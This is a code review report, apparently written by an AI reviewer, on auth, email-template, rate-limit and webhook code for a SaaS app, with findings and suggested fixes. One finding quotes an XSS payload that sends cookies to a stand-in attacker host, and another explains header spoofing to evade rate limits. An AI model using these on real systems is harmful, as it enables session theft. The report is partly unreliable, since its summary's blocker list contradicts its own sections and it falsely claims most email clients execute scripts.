---
phase: 11-auth-essentials
reviewed: 2026-05-02T12:00:00Z
depth: standard
files_reviewed: 16
files_reviewed_list:
  - burnlens_cloud/database.py
  - burnlens_cloud/email.py
  - burnlens_cloud/emails/templates/welcome.html
  - burnlens_cloud/emails/templates/verify_email.html
  - burnlens_cloud/emails/templates/password_changed.html
  - burnlens_cloud/emails/templates/reset_password.html
  - burnlens_cloud/emails/templates/payment_receipt.html
  - burnlens_cloud/models.py
  - burnlens_cloud/auth.py
  - burnlens_cloud/rate_limit.py
  - burnlens_cloud/billing.py
  - frontend/src/lib/hooks/useAuth.ts
  - frontend/src/app/setup/page.tsx
  - frontend/src/app/reset-password/page.tsx
  - frontend/src/app/verify-email/page.tsx
  - frontend/src/components/BillingStatusBanner.tsx
  - frontend/src/components/Shell.tsx
findings:
  critical: 4
  warning: 7
  info: 3
  total: 14
status: issues_found
---

# Phase 11: Code Review Report

**Reviewed:** 2026-05-02T12:00:00Z
**Depth:** standard
**Files Reviewed:** 16
**Status:** issues_found

## Summary

Phase 11 introduces password-reset and email-verification flows, email templates, a resend-verification endpoint, and frontend pages for these flows. The auth machinery is generally solid — token hashing is consistent (SHA-256 of `secrets.token_urlsafe(32)`), single-use atomicity is correctly implemented via the `UPDATE ... WHERE used_at IS NULL` pattern, and the JWT session cookie (HttpOnly, Secure in prod) is correctly issued.

Four blockers were found: (1) the `confirm_password_reset` handler reads `user_id` from the token row **after** marking it used, creating a TOCTOU window where a race between two near-simultaneous redemptions can result in the password being reset for **no user** (null user_id lookup); (2) the email verification endpoint is a GET that accepts the secret token in the URL query string, which causes the token to appear in server access logs, proxy logs, browser history, and Referer headers; (3) the `send_invitation_email` function interpolates user-supplied `workspace_name` and `invited_by_name` directly into an HTML string via an f-string — no escaping — enabling a stored-XSS attack on recipients if those fields contain HTML; and (4) the rate-limit rule for the new `/auth/resend-verification` endpoint is entirely absent from `DEFAULT_RULES`, leaving it open to unlimited enumeration and email-bomb abuse.

---

## Critical Issues

### CR-01: TOCTOU in `confirm_password_reset` — user_id fetched after token is consumed

**File:** `burnlens_cloud/auth.py:1011-1034`

**Issue:** The handler first marks the token `used_at = now()` via `execute_insert` (which returns a rowcount string, not rows). It then issues a **second** `SELECT user_id FROM auth_tokens WHERE token_hash = $1` to find the user. The SELECT has **no** `AND used_at IS NULL` filter, so the pattern is safe against double-use — but it is semantically fragile in a different way: the atomicity window is real. More concretely, the SELECT at line 1024 will succeed only if the row still physically exists. However, the two-query structure also means the handler would reset the password of the **wrong user** if (hypothetically) the row were deleted between the UPDATE and the SELECT in a cleanup job. The fix is to obtain `user_id` from the same atomic UPDATE by using `RETURNING user_id` — eliminating the second round-trip and making the logic provably atomic with no window at all.

```python
# Replace lines 1011–1030 with:
row = await execute_query(
    """
    UPDATE auth_tokens SET used_at = now()
    WHERE token_hash = $1
      AND type = 'password_reset'
      AND used_at IS NULL
      AND expires_at > now()
    RETURNING user_id
    """,
    token_hash,
)
if not row:
    raise HTTPException(status_code=400, detail="Reset link is invalid or has expired.")
user_id = str(row[0]["user_id"])
```

The same structural issue exists in `verify_email` at lines 1055–1074 and should be fixed identically.

---

### CR-02: Same TOCTOU in `verify_email` — user_id fetched after token is consumed

**File:** `burnlens_cloud/auth.py:1055-1074`

**Issue:** Identical two-query pattern as CR-01. The UPDATE at line 1055 consumes the token; the SELECT at line 1068 fetches `user_id` in a separate round-trip with no atomicity guarantee. Under concurrent load (or a race with the cleanup path) the SELECT could return zero rows after the UPDATE succeeded, causing the endpoint to raise a 400 even though the token was valid and has now been permanently burned.

```python
# Replace lines 1055–1074 with:
row = await execute_query(
    """
    UPDATE auth_tokens SET used_at = now()
    WHERE token_hash = $1
      AND type = 'email_verification'
      AND used_at IS NULL
      AND expires_at > now()
    RETURNING user_id
    """,
    token_hash,
)
if not row:
    raise HTTPException(status_code=400, detail="Verification link is invalid or has expired.")
user_id = str(row[0]["user_id"])
await execute_insert(
    "UPDATE users SET email_verified_at = now() WHERE id = $1", user_id
)
return {"message": "Email verified successfully."}
```

---

### CR-03: Email verification token exposed in server/proxy logs (GET with token in query string)

**File:** `burnlens_cloud/auth.py:1050-1078`

**Issue:** `GET /auth/verify-email?token=<raw_token>` places the secret token in the URL. URLs are routinely logged by: Railway's request log, any HTTP proxy, browser history, the `Referer` header if the verification page contains any external resources (analytics, CDN fonts). A token that appears in a server access log is no longer secret — anyone with log access can verify any pending email or probe whether the token was already used.

The industry-standard fix is to make the endpoint a POST that accepts the token in the request body. The frontend (`verify-email/page.tsx`) currently calls it as a GET at line 23; both sides must be updated together.

```python
# In auth.py — change to POST:
class VerifyEmailBody(BaseModel):
    token: str

@router.post("/verify-email", status_code=200)
async def verify_email(body: VerifyEmailBody):
    token_hash = hashlib.sha256(body.token.encode()).hexdigest()
    ...
```

```typescript
// In verify-email/page.tsx line 23 — change to POST:
fetch(`${API_BASE}/auth/verify-email`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ token }),
})
```

---

### CR-04: Stored XSS via unescaped `workspace_name` / `invited_by_name` in invitation email HTML

**File:** `burnlens_cloud/email.py:119-146`

**Issue:** The invitation email body is assembled by direct f-string interpolation at lines 119–146. Both `workspace_name` and `invited_by_name` come from user-supplied data stored in the database. A workspace owner who sets their workspace name to `<script>fetch('https://evil.example/'+document.cookie)</script>` will send that payload verbatim inside the `<body>` of every invitation email. Email clients that render HTML (the majority of modern clients) will execute it, allowing credential theft for invited users.

None of the new template-based emails (`send_welcome_email`, `send_verify_email`, etc.) have this problem because they use `str.replace()` on static placeholders — but the old `send_invitation_email` function was not migrated to the template system and still uses raw f-string interpolation.

```python
# Fix: HTML-escape user-supplied values before interpolation.
import html as _html

safe_workspace = _html.escape(workspace_name)
safe_inviter = _html.escape(invited_by_name) if invited_by_name else None

# Then replace the f-string inline references:
# {f"<strong>{invited_by_name}</strong> has invited..."  →
# {f"<strong>{safe_inviter}</strong> has invited..."
# <strong>{workspace_name}</strong>  →  <strong>{safe_workspace}</strong>
# {invite_url} in the href is a URL, not raw HTML — urllib.parse.quote it:
safe_url = urllib.parse.quote(invite_url, safe=':/?=&')
```

Similarly, `invite_url` is used in an `href` attribute and a `<code>` block. The `<code>` placement does not execute scripts but the href should be validated to prevent `javascript:` URLs if `settings.burnlens_frontend_url` were ever set to an attacker-controlled value.

---

## Warnings

### WR-01: Rate-limit rule missing for `/auth/resend-verification`

**File:** `burnlens_cloud/rate_limit.py:86-92`

**Issue:** `DEFAULT_RULES` covers `/auth/login`, `/auth/signup`, `/auth/invite`, and `/auth/reset-password` but has **no entry for `/auth/resend-verification`**. Without a rate limit an attacker can:
1. Enumerate which email addresses are registered (the endpoint returns a different server response path depending on whether the user exists and is unverified, detectable via timing — though the response text is the same, the DB round-trip count differs).
2. Trigger unlimited outbound emails from the SendGrid account to a single target, constituting an email-bomb attack.

```python
# Add to DEFAULT_RULES in rate_limit.py:
("/auth/resend-verification", 3, 900),   # same budget as reset-password
```

---

### WR-02: `email_verified` flag sourced from localStorage — can be tampered by the user to suppress the verification banner

**File:** `frontend/src/lib/hooks/useAuth.ts:60-62` and `frontend/src/app/setup/page.tsx:31`

**Issue:** `emailVerified` is persisted to `localStorage` by `storeSession` (setup/page.tsx line 31) and read back at `useAuth.ts:60-62`. A user can open DevTools, run `localStorage.setItem("burnlens_email_verified", "true")`, and the `BillingStatusBanner` verification reminder will disappear permanently — even if their email is genuinely unverified.

This is a UX/integrity issue rather than a security bypass: the actual email-verification gate is enforced server-side (the `email_verified` claim in the JWT controls gating). However, suppressing the banner means a user who accidentally has `email_verified=false` in their JWT will never see the prompt to verify, and any features gated on `email_verified` will silently fail without explanation.

**Fix:** Derive `emailVerified` from the decoded JWT payload instead of from localStorage. After C-3 the JWT is in the HttpOnly cookie and cannot be read from JS. The correct signal is the `email_verified` field already returned in login/signup JSON responses — store it in the session object in memory only (not localStorage), and re-fetch it from `/auth/me` (or re-read it from the next API response) on page reload.

Alternatively, accept the limitation but add a `?verified=false` query-param on the post-login redirect from `/auth/login` that pre-seeds the in-memory state, so localStorage is only a convenience hint that can be wrong only in the direction of showing more banners (not fewer).

---

### WR-03: `X-Forwarded-For` header trusted unconditionally — rate limit trivially bypassed

**File:** `burnlens_cloud/rate_limit.py:41-47`

**Issue:** `_client_ip` takes the **first** comma-separated value from `X-Forwarded-For` verbatim. An attacker can send `X-Forwarded-For: 1.2.3.4` in every request, causing all their requests to be counted under the same spoofed IP bucket — which they then rotate per request by sending a new random IP in the header. The rate limiter effectively becomes no-op against any client that controls their request headers.

Railway does prepend a real `X-Forwarded-For` entry, but it **appends** to any existing header the client sends, not overrides it. The legitimate IP from Railway is the **last** entry, not the first.

```python
def _client_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for", "")
    if xff:
        # Railway appends; take the LAST hop (closest trusted proxy's view).
        return xff.split(",")[-1].strip()
    return request.client.host if request.client else "unknown"
```

Note: the "correct" entry index depends on Railway's exact proxy topology and the number of trusted hops. Using the last entry is safer than the first when the proxy layer is not configured to strip/overwrite the header. Teams deploying behind multiple proxy layers should configure `TRUSTED_PROXY_COUNT` and slice accordingly.

---

### WR-04: `email_verified` claim in login JWT uses variable `row` that may be unbound in the `api_key` branch

**File:** `burnlens_cloud/auth.py:685`

**Issue:** Line 685 reads `bool(row.get("email_verified_at"))`. In the **email+password branch** (lines 588–638), `row` is `member_result[0]` which comes from a JOIN that includes `w.active` but not `email_verified_at` — so `row.get("email_verified_at")` will always return `None` (the column is not in the SELECT), meaning `email_verified_at` is never reflected in the login response even after verification. In the **api_key branch** (lines 640–675) `row` is similarly a workspace row that does not include `email_verified_at`.

In both branches `email_verified` therefore falls back entirely to `not bool(has_pending_token)`, which is correct for new users but silently wrong for verified users who have no pending token AND no `email_verified_at` set (grandfathered users). This is an off-by-one semantic, not a security bypass, but it means verified users might see the verification banner indefinitely.

**Fix:** Fetch `email_verified_at` for the resolved `user_id` explicitly, as a separate query scoped to the `users` table.

```python
verified_row = await execute_query(
    "SELECT email_verified_at FROM users WHERE id = $1", user_id
)
is_verified_by_timestamp = bool(
    verified_row and verified_row[0]["email_verified_at"]
)
email_verified = is_verified_by_timestamp or not bool(has_pending_token)
```

---

### WR-05: `send_invitation_email` does not use the `TEMPLATE_REGISTRY` / file-based template system

**File:** `burnlens_cloud/email.py:119-147`

**Issue:** All other Phase 11 email functions (`send_welcome_email`, `send_verify_email`, `send_reset_password_email`, `send_payment_receipt_email`) load HTML from files under `emails/templates/` via `TEMPLATE_REGISTRY`. `send_invitation_email` alone builds its HTML inline via an f-string. This inconsistency means:
- The invitation email's HTML cannot be edited without touching Python source code.
- The `TEMPLATE_REGISTRY` (which declares `required_vars`) cannot validate that the invitation email's substitution is complete.
- The XSS issue in CR-04 stems directly from this pattern.

**Fix:** Create `emails/templates/invitation.html` with `{{workspace_name}}`, `{{invited_by_name}}`, and `{{invite_url}}` placeholders, add an entry in `TEMPLATE_REGISTRY`, and rewrite `send_invitation_email` to use the same `template.replace(...)` pattern as the other senders. Ensure values are HTML-escaped before substitution (see CR-04).

---

### WR-06: Webhook signature tolerance of 60 seconds is too tight for clock skew in practice, but the critical gap is: tolerance check uses `time.time()` (wall clock) not the signed `ts` relative to event creation — replay window is exactly `tolerance`

**File:** `burnlens_cloud/billing.py:296-315`

**Issue:** `_verify_signature` uses `tolerance=60` (line 296 default). The replay-prevention logic at line 309 is:
```python
if abs(int(time.time()) - int(ts)) > tolerance:
    return False
```
This correctly rejects requests more than 60 seconds old. However `tolerance=60` also means any captured Paddle webhook can be replayed within a 60-second window. This is the standard Paddle recommendation so it is not wrong per se, but it should be documented as a known window. More importantly: the `tolerance` parameter is exposed as a function argument with a mutable default. Any call that accidentally passes `tolerance=0` or a very large value (e.g. from config drift) silently changes the security properties of every webhook. The parameter should have an assertion guard.

This is a warning-level finding because the current code is within Paddle's documented guidance; the concern is the unguarded parameter.

```python
def _verify_signature(header: str, raw_body: bytes, secret: str, tolerance: int = 60) -> bool:
    assert 0 < tolerance <= 300, f"tolerance must be between 1 and 300 seconds, got {tolerance}"
    ...
```

---

### WR-07: `BillingStatusBanner` "resend verification email" link goes to `/setup`, not to a resend endpoint

**File:** `frontend/src/components/BillingStatusBanner.tsx:83-91`

**Issue:** The verification reminder banner links to `href="/setup"` with the text "resend verification email". The `/setup` page is the login/register form — it has no resend-verification UI. A user clicking this link lands on the login page with no obvious way to trigger a resend. The POST `/auth/resend-verification` endpoint exists server-side but there is no frontend surface that calls it from the banner.

**Fix:** Either link to a dedicated resend page, or wire up a button that POSTs to `/auth/resend-verification` inline. At minimum, the link text should match what the destination page actually does.

```tsx
// Option A: button that calls the API directly
<button
  onClick={async () => {
    await fetch(`${API_BASE}/auth/resend-verification`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: session.ownerEmail }),
      credentials: "include",
    });
  }}
  ...
>
  resend verification email
</button>
```

---

## Info

### IN-01: `password_changed` email template has no support contact link

**File:** `burnlens_cloud/emails/templates/password_changed.html:8`

**Issue:** The template says "contact support immediately" but provides no link, email address, or URL to actually do so. A user who receives this alert after a credential theft has no actionable path.

**Fix:** Add a support URL: `<a href="mailto:support@burnlens.app">contact support</a>` or a link to a support page.

---

### IN-02: `TEMPLATE_REGISTRY` declares `required_vars` but they are never validated at send time

**File:** `burnlens_cloud/email.py:24-50`

**Issue:** `TEMPLATE_REGISTRY` includes a `required_vars` field per template (e.g., `["workspace_name"]` for `welcome`, `["verify_url"]` for `verify_email`). None of the sender functions check that every declared `required_var` is present in the template after substitution, nor do they validate that a non-substituted placeholder (e.g. `{{verify_url}}` still present in the rendered body) would cause a broken email. The registry adds cognitive overhead without enforcement.

**Fix:** Add a post-substitution check in a shared `_render_template(spec, vars)` helper:

```python
def _render_template(spec: TemplateSpec, vars: dict[str, str]) -> str:
    template = (_TEMPLATE_DIR / spec["template_file"]).read_text(encoding="utf-8")
    for key, val in vars.items():
        template = template.replace(f"{{{{{key}}}}}", val)
    for rv in spec["required_vars"]:
        if f"{{{{{rv}}}}}" in template:
            raise ValueError(f"Template var {{{{{rv}}}}} was not substituted")
    return template
```

---

### IN-03: `InvitationResponse` model exposes raw invitation `token` in API response

**File:** `burnlens_cloud/models.py:279-285`

**Issue:** `InvitationResponse` at line 279 includes a `token: str` field. This is the plaintext invitation token that the server generated and stores as a hash. Returning it in the response is intentional (so the inviter can copy the link) — but it means any code path that accidentally logs the response body (e.g., a structured-logging middleware) will record the plaintext token. There is no immediate security bug here since the token is only usable once and expires, but the field should be documented explicitly as "one-time reveal, never re-emitted", matching the pattern already documented for `ApiKeyCreateResponse.key`.

**Fix:** Add a docstring to `InvitationResponse` identical to the one on `ApiKeyCreateResponse`:
```python
class InvitationResponse(BaseModel):
    """...
    `token` is emitted EXACTLY ONCE at invitation-creation time.
    Never stored in plaintext server-side. Callers must capture it.
    """
```

---

_Reviewed: 2026-05-02T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
